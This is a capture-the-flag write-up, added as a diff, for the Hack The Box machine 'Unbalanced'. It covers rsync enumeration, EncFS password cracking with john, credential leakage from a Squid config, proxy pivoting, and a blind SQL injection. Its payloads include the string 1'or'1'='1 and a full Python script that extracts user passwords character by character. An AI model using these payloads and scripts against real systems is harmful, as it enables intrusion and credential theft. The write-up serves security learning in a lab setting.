@@ -1,0 +1,645 @@
+I"�<h1 id="unbalanced-">Unbalanced <br /></h1>
+
+<p><img src="images/unbalanced/1.png# icon" alt="Unbalanced icon" /></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>Started with the following nmap command:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p</span> 1-10000 <span class="nt">-oA</span> nmap.res <span class="nt">-v</span> unbalanced.htb
+</code></pre></div></div>
+<p><br />And here is the result
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>unbalanced.htb <span class="o">(</span>10.10.10.200<span class="o">)</span>
+Host is up, received conn-refused <span class="o">(</span>0.000054s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2020-11-04 09:22:55 EST <span class="k">for </span>170628s
+Not shown: 9574 closed ports, 423 filtered ports
+Reason: 9574 conn-refused, 422 net-unreaches and 1 no-response
+PORT     STATE SERVICE    REASON  VERSION
+22/tcp   open  tcpwrapped syn-ack
+|_ssh-hostkey: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+873/tcp  open  tcpwrapped syn-ack
+3128/tcp open  tcpwrapped syn-ack
+</code></pre></div></div>
+<p><br />We basically have three ports open (22 - SSH, 873 - ???, 3128 - ???). We’ll know about the unidentified ports later.</p>
+
+<h2 id="rsync">Rsync</h2>
+
+<p>We first check the port 873. Since it wasn’t specified what service it is by the nmap, we can check it ourselves what service it might be running. We can check it <a href="https://www.speedguide.net/port.php?port=873">here</a>. It turns out this port might be an <strong>rsync</strong> service. We can quickly check if we can list some directories or files through this command:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rsync <span class="nt">--list-only</span> rsync://10.10.10.200:873/
+</code></pre></div></div>
+<p><br />After the execution, we are able to list a directory!
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>conf_backups   	EncFS-encrypted configuration backups
+</code></pre></div></div>
+<p><br />Let’s download the contents.</p>
+
+<h3 id="retrieving-conf_backups">Retrieving “conf_backups”</h3>
+
+<p>We can retrieve the <strong>“conf_backups”</strong> through this command:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>conf_backups
+<span class="nb">cd </span>conf_backups
+rsync <span class="nt">-a</span> rsync://10.10.10.200:873/conf_backups ./
+</code></pre></div></div>
+<p><br />After that, we can list the contents of the directory. However, it seems the files are gibberish.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rsync/conf_backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 632
+drwxr-xr-x 2 altelus altelus   4096 Apr  4  2020 <span class="nb">.</span>
+drwxr-xr-x 5 altelus altelus   4096 Nov  4 10:40 ..
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    154 Apr  4  2020 0K72OfkNRRx3-f0Y6eQKwnjn
+<span class="nt">-rw-r--r--</span> 1 altelus altelus     56 Apr  4  2020 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    190 Apr  4  2020 2VyeljxHWrDX37La6FhUGIJS
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    537 Apr  4  2020 3cdBkrRF7R5bYe1ZJ0KYy786
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    386 Apr  4  2020 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    560 Apr  4  2020 3xB4vSQH-HKVcOMQIs02Qb9,
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    275 Apr  4  2020 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    463 Apr  4  2020 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   2169 Apr  4  2020 5FTRnQDoLdRfOEPkrhM2L29P
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    238 Apr  4  2020 5IUA28wOw0wwBs8rP5xjkFSs
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   1277 Apr  4  2020 6R1rXixtFRQ5c9ScY8MBQ1Rg
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    108 Apr  4  2020 7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   1339 Apr  4  2020 7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   1050 Apr  4  2020 8CBL-MBKTDMgB6AT2nfWfq-e
+<span class="nt">-rw-r--r--</span> 1 altelus altelus     29 Apr  4  2020 8e6TAzw0xs2LVxgohuXHhWjM
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    152 Apr  4  2020 8XDA,IOhFFlhh120yl54Q0da
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   5721 Apr  4  2020 9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   2980 Apr  4  2020 A4qOD1nvqe9JgKnslwk1sUzO
+...
+...
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   1268 Apr  4  2020 dNTEvgsjgG6lKBr8ev8Dw,p7
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   2359 Apr  4  2020 ECXONXBBRwhb5tYOIcjjFZzh
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   1297 Apr  2  2020 .encfs6.xml
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   1464 Apr  4  2020 F4F9opY2nhVVnRgiQ,OUs-Y0
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    354 Apr  4  2020 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    135 Apr  4  2020 <span class="nt">-FjZ6-6</span>,Fa,tMvlDsuVAO7ek
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   3275 Apr  4  2020 FSXWRSwW6vOvJ0ExPK0fXJ6F
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    422 Apr  4  2020 gK5Z2BBMSh9iFyCFfIthbkQ6
+...
+...
+</code></pre></div></div>
+<p><br />Of all these, there is only one file that is readable and it’s <strong>.encfs6.xml</strong>. It turns out this is an <strong>EncFs</strong>.</p>
+<blockquote>
+  <p><em>EncFS is a userspace stackable cryptographic file-system similar to eCryptfs,</em></p>
+
+  <p><em>- <a href="https://wiki.archlinux.org/">Wiki Archlinux</a></em></p>
+</blockquote>
+
+<p><br />We need somehow to decrypt and mount this filesystem to be used.</p>
+
+<h3 id="cracking-the-encrypted-conf_backups">Cracking the encrypted “conf_backups”</h3>
+
+<p>We can crack the encrypted filesystem by using <strong>encfs2john</strong> to format a file that will be compatible to <strong>john the ripper</strong>.</p>
+
+<h4 id="using-encfs2john-to-generate-hash">Using “encfs2john” to generate hash</h4>
+
+<p>Using the <strong>encfs2john</strong>, we need to point the name of the directory of the encrypted filesystem (conf_backups in this case). Then, we have to output in a file:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/john/encfs2john.py conf_backups/ <span class="o">&gt;</span> encfs.crackable
+</code></pre></div></div>
+<p><br />And then, we proceed with cracking it using john the ripper
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>john <span class="nt">--wordlist</span> /usr/share/wordlists/rockyou.txt encfs.crackable <span class="nt">--format</span><span class="o">=</span>encfs
+</code></pre></div></div>
+<p><br />After waiting, <strong>JTR</strong> has actually found the password:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>EncFS <span class="o">[</span>PBKDF2-SHA1 128/128 AVX 4x AES]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 580280 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+
+bubblegum        <span class="o">(</span>conf_backups/<span class="o">)</span>
+1g 0:00:02:07 DONE <span class="o">(</span>2020-12-05 09:27<span class="o">)</span> 0.007865g/s 18.37p/s 18.37c/s 18.37C/s loveya..puppies
+</code></pre></div></div>
+<p><br />Password is <em><strong>bubblegum</strong></em>. We now have to mount it</p>
+
+<h3 id="mounting-the-decrypted-conf_backups">Mounting the decrypted “conf_backups”</h3>
+
+<p>We can edit <strong>/etc/fstab</strong> then use <strong>mount</strong> command to mount the EncFS.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># /etc/fstab: static file system information.</span>
+...
+...
+...
+<span class="c"># the settings below is appended</span>
+encfs#/home/altelus/HTB/boxes/Unbalanced/enums/rsync/conf_backups	/mnt/decr_conf_backups	fuse	noauto,user	0	0
+</code></pre></div></div>
+<p><br /><em>More info <a href="https://wiki.archlinux.org/index.php/EncFS#Mount_via_fstab">here</a></em>
+<br />Then we proceed to mounting
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>mount /mnt/decr_conf_backups/
+EncFS Password:
+</code></pre></div></div>
+<p><br />Enter the password upon mount. Let’s check if it worked by visiting <strong>/mnt/decr_conf_backups</strong>
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /mnt/decr_conf_backups/
+<span class="nb">ls</span> <span class="nt">-lart</span>
+total 628
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    246 Apr  4  2020 dconf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    100 Apr  4  2020 x86_64-linux-gnu.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus     44 Apr  4  2020 libc.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus     38 Apr  4  2020 fakeroot-x86_64-linux-gnu.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    435 Apr  4  2020 logrotate.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    332 Apr  4  2020 ldap.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    144 Apr  4  2020 kernel-img.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   4491 Apr  4  2020 main.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    120 Apr  4  2020 network.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    927 Apr  4  2020 input.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    604 Apr  4  2020 deluser.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    414 Apr  4  2020 user-dirs.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    280 Apr  4  2020 fuse.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus     87 Apr  4  2020 resolv.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    195 Apr  4  2020 modules.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus     34 Apr  4  2020 ld.so.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   2584 Apr  4  2020 gai.conf
+...
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   1260 Apr  4  2020 ucf.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   1628 Apr  4  2020 system.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   2041 Apr  4  2020 semanage.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    510 Apr  4  2020 nsswitch.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    281 Apr  4  2020 udev.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus 316553 Apr  4  2020 squid.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    230 Apr  4  2020 debian.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   5713 Apr  4  2020 ca-certificates.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   2179 Apr  4  2020 time.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus    419 Apr  4  2020 sepermit.conf
+<span class="nt">-rw-r--r--</span> 1 altelus altelus   2972 Apr  4  2020 pam_env.conf
+...
+...
+</code></pre></div></div>
+<p><br />The files are finally decrypted! We just have to copy the files so that we don’t have to mount it again.</p>
+
+<h2 id="squid-http-proxy">Squid HTTP Proxy</h2>
+
+<p>Another port that we are not familiar with is the <strong>port 3128</strong>. It turns out it is a <strong>Squid Proxy</strong>. We can check it <a href="https://www.speedguide.net/port.php?port=3128">here</a>. We actually have seen a <strong>squid.conf</strong> file in our decrypted files earlier. Let’s check it.</p>
+
+<h3 id="squid-configuration-file">Squid configuration file</h3>
+
+<p>Upon opening the squid.conf, there are quite a number of interesting things</p>
+
+<h4 id="cachemgr_passwd-section">Cachemgr_passwd section</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+<span class="c">#Default:</span>
+<span class="c"># No password. Actions which require password are denied.</span>
+cachemgr_passwd Thah<span class="nv">$Sh1</span> menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
+cachemgr_passwd disable all
+...
+</code></pre></div></div>
+<p><br />According to <strong><a href="http://www.squid-cache.org/Doc/config/cachemgr_passwd/">squid-cach.org</a></strong>, we actually have another password.
+<br />
+<img src="images/unbalanced/2.png# medium" alt="image cachemgr_passwd" />
+<br />We should be able access the squid’s cache management system with this password.</p>
+
+<h4 id="allowed-to-access-internal-servers">Allowed to access internal servers</h4>
+
+<p>It is defined at <strong>line 1410</strong> which domains or ips are allowed to be accessed through http:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-n</span>+1410 squid.conf | <span class="nb">head</span> <span class="nt">-n</span> 10
+
+<span class="c"># Allow access to intranet</span>
+acl intranet dstdomain <span class="nt">-n</span> intranet.unbalanced.htb
+acl intranet_net dst <span class="nt">-n</span> 172.16.0.0/12
+http_access allow intranet
+http_access allow intranet_net
+...
+</code></pre></div></div>
+<p><br />As we can see, through the domain name, we can only access <strong>intranet.unbalanced.htb</strong>. Let’s access it.</p>
+<h5 id="setting-our-proxy-foxyproxy-is-used-here">Setting our proxy (FoxyProxy is used here)</h5>
+<p>But before accessing, let’s set our http proxy to the squid. Here is my FoxyProxy settings
+<br /><img src="images/unbalanced/3.png# medium" alt="FoxyProxy settings" />
+<br />After setting the proxy up, let’s access the intranet:
+<br /><img src="images/unbalanced/4.png# medium-p" alt="login page" />
+<br />It’s a login page! We will come back to it later. Remember that we are not only given with accessible domain but also with accessible range of IP. We also need to check them first</p>
+
+<h3 id="squid-management-enumeration">Squid Management Enumeration</h3>
+<p>Let’s now check the actions we can do with the squid cache manager with the password we have (password: <em><strong>Thah$Sh1</strong></em>). Let’s use the <em><strong>squidclient</strong></em> cli to tinker with the squid cache manager.
+<br />Let’s check first the menu.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>squidclient <span class="nt">-h</span> 10.10.10.200 <span class="nt">-w</span> <span class="s1">'Thah$Sh1'</span> mgr:menu
+HTTP/1.1 200 OK
+Server: squid/4.6
+Mime-Version: 1.0
+Date: Sat, 05 Dec 2020 15:38:38 GMT
+Content-Type: text/plain<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
+Expires: Sat, 05 Dec 2020 15:38:38 GMT
+Last-Modified: Sat, 05 Dec 2020 15:38:38 GMT
+X-Cache: MISS from unbalanced
+X-Cache-Lookup: MISS from unbalanced:3128
+Via: 1.1 unbalanced <span class="o">(</span>squid/4.6<span class="o">)</span>
+Connection: close
+
+ index                 	Cache Manager Interface         	disabled
+ menu                  	Cache Manager Menu              	protected
+ offline_toggle        	Toggle offline_mode setting     	disabled
+ shutdown              	Shut Down the Squid Process     	disabled
+ reconfigure           	Reconfigure Squid               	disabled
+ rotate                	Rotate Squid Logs               	disabled
+ pconn                 	Persistent Connection Utilization Histograms	protected
+ mem                   	Memory Utilization              	protected
+ ...
+ ...
+ cbdata                	Callback Data Registry Contents 	protected
+ sbuf                  	String-Buffer statistics        	protected
+ events                	Event Queue                     	protected
+ netdb                 	Network Measurement Database    	disabled
+ asndb                 	AS Number Database              	disabled
+ ...
+</code></pre></div></div>
+<p><br />As we can see, our access is pretty limited. What we can access here (with “protected”) is also defined in the squid.conf that we retrieved earlier. Let’s start checking them</p>
+
+<h4 id="squid-fqdncache-to-check-any-internal-server">Squid “fqdncache” to check any internal server</h4>
+
+<p>After a lot of checking, the action that should give us the most valuable info is the “fqdncache”.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>squidclient <span class="nt">-h</span> 10.10.10.200 <span class="nt">-w</span> <span class="s1">'Thah$Sh1'</span> mgr:fqdncache
+HTTP/1.1 200 OK
+Server: squid/4.6
+Mime-Version: 1.0
+...
+...
+
+Address                                       Flg TTL Cnt Hostnames
+127.0.1.1                                       H <span class="nt">-001</span>   2 unbalanced.htb unbalanced
+::1                                             H <span class="nt">-001</span>   3 localhost ip6-localhost ip6-loopback
+172.31.179.2                                    H <span class="nt">-001</span>   1 intranet-host2.unbalanced.htb
+172.31.179.3                                    H <span class="nt">-001</span>   1 intranet-host3.unbalanced.htb
+127.0.0.1                                       H <span class="nt">-001</span>   1 localhost
+172.17.0.1                                      H <span class="nt">-001</span>   1 intranet.unbalanced.htb
+ff02::1                                         H <span class="nt">-001</span>   1 ip6-allnodes
+ff02::2                                         H <span class="nt">-001</span>   1 ip6-allrouters
+</code></pre></div></div>
+<p><br />We can see here that there are more domain to IP mapping are present for internal servers! We should also notice that there is the <em><strong>intranet.unbalanced.htb</strong></em> that we are allowed to access as it is, a domain name, earlier at squid.conf. Also notice the <em><strong>intranet-host[2-3].unbalanced.htb</strong></em> domain names  <em><strong>are not defined in squid.conf</strong></em>! But they are technically allowed through the allowed IP address range.</p>
+
+<h2 id="intranet-login">Intranet Login</h2>
+<p>Let’s go back to the intranet login. Let’s just put “admin” as username and “password” as credentials just to check its behavior.<br />
+<img src="images/unbalanced/5.png# medium" alt="login with data" />
+<br />After submitting, nothing seems to happen. It’s as if the intranet login portal did not respond to our login. No prompt if we got the credentials correct or not. Let’s check the http response headers.<br />
+<img src="images/unbalanced/6.png# medium" alt="http headers" />
+<br />Notice that the responding server is the <em><strong>intranet-host2.unbalanced.htb</strong></em> and not <em><strong>intranet.unbalanced.htb</strong></em>. It might mean that the infrastructure may be using <strong>Load Balancer</strong> to pass the requests from the <em><strong>intranet.unbalanced.htb</strong></em> to the other servers which are <em><strong>intranet-host2.unbalanced.htb</strong></em> and <em><strong>intranet-host3.unbalanced.htb</strong></em>. However, if there is host2 and host3, there must be a <em><strong>host1</strong></em>. Let’s try accessing that.</p>
+
+<h2 id="accessing-intranet-host1unbalancedhtb">Accessing “intranet-host1.unbalanced.htb”</h2>
+<p>The domain name itself is not defined but remember that we can access the servers themselves through the IP address since we are allowed by Squid http proxy. If <em><strong>172.31.179.2 = intranet-host2.unbalanced.htb</strong></em> and <em><strong>172.31.179.3 = intranet-host3.unbalanced.htb</strong></em>, then there is a high possibility that <em><strong>172.31.179.1 = intranet-host1.unbalanced.htb</strong></em>. Let’s access the <strong>172.31.179.1</strong><br />
+<img src="images/unbalanced/7.png# medium" alt="host1" />
+<br />Host1 actually exists! However, there is no intranet login. One step back, we can see that the url changes when we try to access <strong>intranet.unbalanced.htb</strong>. We are being redirected to <strong>/intranet.php</strong><br />
+<img src="images/unbalanced/8.png# medium" alt="intranet.php" />
+<br />Now let’s just try accessing the <strong>intranet.php</strong> in 172.31.179.1. (http://172.31.179.1/intranet.php)
+<br />After accessing, indeed the <strong>intranet.php</strong> page exists but there seems to be no difference than the other servers. Let’s now try logging in and check if we can now receive a different response this time. (still “admin” as username and “password” as password)<br />
+<img src="images/unbalanced/9.png# medium-p" alt="invalid creds" />
+<br />There is now a login response! Let’s now tinker this login form if it has a vulnerability or if we can use our credentials earlier (although we don’t have a legitimate username)</p>
+
+<h2 id="blind-sqli-against-server-172311791-form">Blind SQLi against server 172.31.179.1 Form</h2>
+<p>We first need to fuzz for SQL Injection vulnerability that might be existing in the form. We will be using burp in this.
+<br />Let’s first set our Upstream Proxy Servers to Squid Proxy(10.10.10.200 - 3128)<br />
+<img src="images/unbalanced/11.png# medium" alt="target proxy" />
+<br />Then let’s intercept the login and then send to <strong>Repeater</strong><br />
+<img src="images/unbalanced/10.png# medium" alt="repeater" />
+<br />After we send it to <strong>Repeater</strong>, paste the whole requests to <strong>Intruder -&gt; Positions</strong><br />
+<img src="images/unbalanced/12.png# medium" alt="ip" />
+<br />Then we will get our SQLi fuzz list from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/FUZZDB_MYSQL.txt">here</a>. Then past it to <strong>Intruder -&gt; Payloads</strong><br />
+<img src="images/unbalanced/13.png# medium" alt="sfd" />
+<br />Then we can “Start Attack”. After it is finished, we will be checking the <em>length</em> of response.<br />
+<img src="images/unbalanced/14.png# medium" alt="length" />
+<br />Out of these, there are only 3 lengths: 7079, 7185, and 7852. We are of most concern with with the largest since if we managed to leak data, it goes to say that the length of data expected to be received is also larger or longer. So let’s check the response of the intranet login portal by redoing the payload at <em><strong>Password</strong></em> (remember the position at the left - it is a value of 2) in the login page with payload <em><strong>1’or’1’=’1</strong></em>.<br />
+<img src="images/unbalanced/15.png# medium-p" alt="pass" /></p>
+
+<h3 id="leaking-passwords-for-every-user">Leaking passwords for every user</h3>
+<p>From the payload we have used, we know that the resulting query is true since it is leaking all the usernames and false when the data length is low. We can leak the password by having a conditional: <em><strong>&lt;nth character of Password = x&gt; AND Username=&lt;username&gt;</strong></em>. This will convert to the following blind sqli payload: <em><strong>’ or substring(Password, {}, 1) = {} and Username=’{}’ and ‘a</strong></em>. I created a python script to automate it.
+<br /></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"http"</span> <span class="p">:</span> <span class="s">"http://10.10.10.200:3128"</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">blind_attack</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">printable</span><span class="p">,</span> <span class="n">pass_index</span><span class="p">):</span>
+
+    <span class="k">global</span> <span class="n">proxies</span>
+
+    <span class="k">if</span> <span class="n">printable</span> <span class="o">==</span> <span class="s">"'"</span><span class="p">:</span>
+        <span class="n">char</span> <span class="o">=</span> <span class="s">'"</span><span class="se">\'</span><span class="s">"'</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">char</span> <span class="o">=</span> <span class="s">"'{}'"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">printable</span><span class="p">)</span>
+
+
+    <span class="n">exploit_str</span> <span class="o">=</span> <span class="s">"' or substring(Password, {}, 1) = {} and Username='{}' and 'a"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">pass_index</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">user</span><span class="p">)</span>
+
+
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"Username"</span> <span class="p">:</span> <span class="n">user</span><span class="p">,</span>
+        <span class="s">"Password"</span> <span class="p">:</span> <span class="n">exploit_str</span>
+    <span class="p">}</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://172.31.179.1/intranet.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s">"Invalid"</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="k">return</span> <span class="n">printable</span>
+
+<span class="k">def</span> <span class="nf">print_status</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">accumulated</span><span class="p">,</span> <span class="n">current</span><span class="p">,</span> <span class="n">total</span><span class="p">,</span> <span class="n">curr_char</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[{} - {}] {} --&gt; {}/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">curr_char</span><span class="p">,</span> <span class="n">accumulated</span><span class="p">,</span> <span class="n">current</span><span class="p">,</span> <span class="n">total</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">user_file</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">user_file</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">rf</span><span class="p">:</span>
+    <span class="n">users</span> <span class="o">=</span> <span class="n">rf</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">accumulated_pass</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+
+    <span class="n">accumulated_pass</span><span class="p">[</span><span class="n">user</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">pass_index</span> <span class="o">=</span> <span class="mi">1</span>
+
+    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">while</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">[:</span><span class="o">-</span><span class="mi">5</span><span class="p">]):</span>
+
+        <span class="n">print_status</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">accumulated_pass</span><span class="p">[</span><span class="n">user</span><span class="p">],</span> <span class="n">count</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">[:</span><span class="o">-</span><span class="mi">5</span><span class="p">]),</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">[</span><span class="n">count</span><span class="p">])</span>
+
+        <span class="n">printable</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">[</span><span class="n">count</span><span class="p">]</span>
+        <span class="n">ret_char</span> <span class="o">=</span> <span class="n">blind_attack</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">printable</span><span class="p">,</span> <span class="n">pass_index</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">ret_char</span> <span class="o">!=</span> <span class="bp">False</span><span class="p">:</span>
+            <span class="n">accumulated_pass</span><span class="p">[</span><span class="n">user</span><span class="p">]</span> <span class="o">+=</span> <span class="n">ret_char</span>
+            <span class="n">pass_index</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+            <span class="k">continue</span>
+
+        <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+
+
+<span class="k">print</span><span class="p">(</span><span class="n">accumulated_pass</span><span class="p">)</span>
+</code></pre></div></div>
+<p><br />We managed to leak usernames! Nice! However, we can take this further by leaking the passwords. We can get the usernames as a list. We can run the code as follows:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 blind.py usernames.txt
+<span class="o">[</span>rita -  <span class="o">]</span> password01! <span class="nt">--</span><span class="o">&gt;</span> 95/95
+<span class="o">[</span>jim -  <span class="o">]</span> stairwaytoheaven <span class="nt">--</span><span class="o">&gt;</span> 95/95
+<span class="o">[</span>bryan -  <span class="o">]</span> ireallyl0vebubblegum!!! <span class="nt">--</span><span class="o">&gt;</span> 95/95
+<span class="o">[</span>sarah -  <span class="o">]</span> sarah4evah <span class="nt">--</span><span class="o">&gt;</span> 95/95
+</code></pre></div></div>
+<p><br />We now have our passwords! Let’s use them with the ssh!</p>
+<h2 id="user-bryan">User Bryan</h2>
+<p>The one that worked was actually bryan’s (bryan:ireallyl0vebubblegum!!!)
+<br /></p>
